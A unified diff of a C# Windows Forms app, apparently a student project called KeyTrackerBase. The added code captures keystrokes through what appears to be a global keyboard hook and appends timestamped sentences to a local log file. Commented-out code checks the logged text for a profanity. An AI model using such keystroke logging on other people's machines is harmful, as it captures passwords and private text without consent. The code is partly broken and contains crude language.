@@ -7,13 +7,21 @@ using System.Diagnostics;
 using System.Threading;
 //using System.Windows.Threading;
 using System.Windows.Forms;
+using System.IO;
 using KeyTrackerBase;
 
 namespace KeyTrackerBase
 {
     public partial class Form1 : Form
     {
+        //bool keys
         bool shift = false;
+
+        //string word = "cunt";
+        string sentence;
+        int countWord = 0;
+        int countChar = 0;
+
         public Form1()
         {
             
@@ -44,37 +52,83 @@ namespace KeyTrackerBase
         {
             RoutedEventArgs f = new RoutedEventArgs();
 
-            #region Key Handling
-            e.Handled = false;
+            //counts characters
+            countChar++;
+
+            #region Spacebar
+            if (e.KeyCode == Keys.Space)
+                countWord++;
+            #endregion
+
+            #region Shift - NOT WORKING (YET)
             if (e.KeyCode == Keys.LShiftKey || e.KeyCode == Keys.RShiftKey)
                 shift = true;//turns shift on for next char
+            #endregion
 
+            #region Backspace
             if (e.KeyCode == Keys.Back)
             {
-                if (textBox1.Text != "")
-                    textBox1.Text = textBox1.Text.Remove(textBox1.Text.Length - 1);
-                e.Handled = false;
-            }
-
-
-            //finds out to be lower or upper case
-            if (e.KeyCode != Keys.Back)//ensures backspace isnt entered into string
-            {
-                if (shift == false)
+                if (sentence != "")
                 {
-                    if (e.KeyCode != Keys.LShiftKey || e.KeyCode == Keys.RShiftKey)
-                        textBox1.Text += ((char)e.KeyValue).ToString().ToLower();
-                }
-                else if (e.KeyCode != Keys.LShiftKey || e.KeyCode == Keys.RShiftKey)
-                {
-                    textBox1.Text += ((char)e.KeyValue).ToString().ToUpper();
-                    shift = false;
+                    sentence = sentence.Remove(sentence.Length - 1);
+                    textBox1.Text = sentence;
+                    e.Handled = false;
                 }
             }
-            if (e.KeyCode == Keys.Return)
-                textBox1.Text += "\n";
             #endregion
+
+            #region Return
+            if (e.KeyCode == Keys.Return)
+            {
+
+            }
+            #endregion
+
+            #region Key Entry Logger (Main)
+            //ensures backspace isnt entered into string
+            if (e.KeyCode != Keys.Back)
+            {
+                sentence += ((char)e.KeyValue).ToString().ToLower();
+                textBox1.Text = sentence;
+                //ends sentence and logs when word count hits 30, character count hits 180, full stop is entered or the return key is entered
+                if (countWord == 30 || countChar == 180 || e.KeyCode == Keys.OemPeriod || e.KeyCode == Keys.Return)
+                    {//asks, is string not empty? & is the string not have \r (what the return key produces)
+                        if (sentence != "" && sentence != "\r")
+                        {
+                            using (StreamWriter file = new StreamWriter(@"C:\\Users\\Jon\\Desktop\\GroupProjectUpdated\\KeyTrackerBase\\log.txt", true))
+                            {
+                                //writes entries to txt file - logger
+                                file.WriteLine(DateTime.Now.ToString() + ":  " + sentence);
+                                //string and ints reset
+                                sentence = "";
+                                countWord = 0;
+                                countChar = 0;
+                                file.Close();
+                            }
+                            
+                        }
+                        else
+                            //ensures the 'returns' arent kept in txt file
+                            sentence = "";
+
+
+
+
+
+                    //StreamReader file = new StreamReader("C:\\Users\\Jon\\Desktop\\GroupProjectUpdated\\KeyTrackerBase\\log.txt");
+                    //while((word = file.ReadLine()) != null)
+                    //{
+                    //    if (textBox1.Text == word)
+                    //        MessageBox.Show("CUNT ALERT!");
+                    //}
+                    //countWord++;
+                    //file.Close();
+                }
+            }
+            #endregion
+
         }
+
 
         void gkh_KeyUp(object sender, System.Windows.Forms.KeyEventArgs e)
         {
